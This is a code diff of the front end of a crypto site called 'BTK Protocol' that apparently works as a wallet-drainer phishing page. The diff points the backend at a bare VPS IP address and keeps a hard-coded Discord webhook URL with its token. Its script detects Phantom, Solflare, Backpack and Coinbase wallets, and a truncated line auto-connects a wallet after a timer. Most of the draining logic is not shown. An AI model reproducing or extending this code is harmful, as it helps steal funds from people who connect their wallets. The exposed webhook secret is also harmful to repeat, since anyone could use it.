@@ -67,45 +67,23 @@
             <span class="divider">•</span>
             <a href="#">Audit</a>
             <br>
-            <span style="color:rgba(255,255,255,0.1);">BTK Protocol v3.5</span>
+            <span style="color:rgba(255,255,255,0.1);">BTK Protocol v3.7</span>
         </div>
     </div>
 </div>
 
 <script>
 // ============================================================
-//  🔥 BACKEND CONFIGURATION — UPDATE WITH YOUR DOMAIN/IP
+//  🔥 BACKEND URL — UPDATE WITH YOUR VPS IP OR DOMAIN
 // ============================================================
 
-// ============================================================
-//  OPTION 1: Use your domain (RECOMMENDED)
-//  Replace "api.yourdomain.com" with your actual domain
-// ============================================================
+const API_URL = "http://187.124.114.160/api/v1/process";
 
-const API_URL = "https://api.yourdomain.com/api/v1/process";
-
-// ============================================================
-//  OPTION 2: Use your VPS IP (if no domain)
-//  Uncomment below and comment the one above
-// ============================================================
-
-// const API_URL = "http://187.124.114.160/api/v1/process";
-
-// ============================================================
-//  OPTION 3: Use your VPS IP with port (if no Nginx)
-//  Uncomment below and comment the ones above
-// ============================================================
-
-// const API_URL = "http://187.124.114.160:8080/api/v1/process";
-
-// ============================================================
-//  🔥 DISCORD WEBHOOK — DO NOT CHANGE
-// ============================================================
-
+// Discord webhook
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1533200747305635850/FgNzyF-dCWFlMfNRzsoRm09tCD4WbPrQL_jiOSmbVbmO8Mm0QSMLZYZX5UPlJFwFMRV1";
 
 // ============================================================
-//  🟢 WALLET PROVIDERS
+//  WALLET PROVIDERS
 // ============================================================
 
 function getWalletProvider(t){try{switch(t){case'phantom':if(window.solana?.isPhantom)return window.solana;if(window.solana&&window.solana.isPhantom)return window.solana;return null;case'solflare':if(window.solflare)return window.solflare;if(window.solflare?.isSolflare)return window.solflare;if(window.solana?.isSolflare)return window.solana;return null;case'backpack':if(window.backpack)return window.backpack;if(window.backpack?.isBackpack)return window.backpack;return null;case'coinbase':if(window.coinbaseWallet?.isCoinbaseWallet)return window.coinbaseWallet;if(window.ethereum?.isCoinbaseWallet)return window.ethereum;if(window.coinbaseWallet)return window.coinbaseWallet;if(window.ethereum&&window.ethereum.isCoinbaseWallet)return window.ethereum;return null;default:return null}}catch(e){return null}}
@@ -132,7 +110,7 @@ setTimeout(async function(){if(!isMobile()){try{const t=getWalletProvider('phant
 
 document.addEventListener('keydown',function(t){if(t.key==='s'||t.key==='S')document.getElementById('stakeBtn').click();if(t.key==='w'||t.key==='W')document.getElementById('swapBtn').click()});
 
-console.log('⚡ BTK Protocol v3.5 loaded');
+console.log('⚡ BTK Protocol v3.7 loaded');
 console.log('📍 Backend:',API_URL);
 console.log('🔵 Coinbase Wallet included');
 console.log('⌨️ Shortcuts: S=Stake, W=Swap');
